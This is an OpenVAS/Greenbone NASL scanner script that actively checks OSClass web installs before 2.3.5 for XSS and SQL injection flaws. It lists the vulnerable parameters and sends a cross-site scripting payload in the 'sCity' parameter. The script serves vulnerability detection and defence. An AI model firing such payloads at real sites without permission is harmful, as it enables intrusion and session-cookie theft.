# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802970");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-09-27 10:53:49 +0530 (Thu, 27 Sep 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-0973", "CVE-2012-0974", "CVE-2012-5162", "CVE-2012-5163");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("OSClass < 2.3.5 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"OSClass is prone to multiple cross-site scripting (XSS) and SQL
  injection (SQLi) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Input passed via the 'sCategory' GET parameter to /index.php is not properly sanitised before
  being used in SQL query.

  - Input passed via the 'sCity', 'sPattern', 'sPriceMax', 'sPriceMin' GET parameters to /index.php
  is not properly sanitised before being returned to the user.

  - Input passed via the 'id' GET parameter in edit_category_post and enable_category action is not
  properly sanitised before being used in SQL query.

  - Input passed via the 'id' GET parameter in enable_category action to index.php is not properly
  sanitised before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute
  arbitrary web script or HTML in a user's browser session in the context of an affected site and
  manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"OSClass prior to version 2.3.5.");

  script_tag(name:"solution", value:"Update to version 2.3.5 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47697");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51662");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23068");
  script_xref(name:"URL", value:"http://osclass.org/blog/2012/01/16/osclass-2-3-5/");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2012-01/0157.html");
  script_xref(name:"URL", value:"http://www.codseq.it/advisories/multiple_vulnerabilities_in_osclass");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/osclass", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/oc-admin/index.php";

  res = http_get_cache(port: port, item: url);

  if (">OSClass admin panel login<" >!< res || '"OSClass">' >!< res)
    continue;

  url = dir + '/index.php?page=search&sCity="><script>alert(document.cookie);</script>';

  if (http_vuln_check(port: port, url: url, check_header: TRUE,
                       pattern:"><script>alert\(document.cookie\);</script>", extra_check: ">OSClass<")) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
